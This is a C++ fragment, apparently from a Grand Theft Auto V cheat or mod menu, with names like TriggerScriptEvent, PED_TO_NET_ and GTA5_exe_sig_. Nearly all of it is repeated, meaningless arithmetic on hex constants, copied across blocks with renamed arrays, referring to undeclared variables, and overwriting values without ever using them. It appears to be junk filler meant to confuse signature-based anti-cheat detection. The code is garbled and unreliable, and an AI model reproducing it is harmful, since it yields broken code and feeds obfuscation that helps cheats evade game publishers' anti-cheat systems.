			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Mod2_b>-1</Mod2_b>");
			Extern_Reader::LOG::LogSemHora("<IsPrimaryColourCustom>false</IsPrimaryColourCustom>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
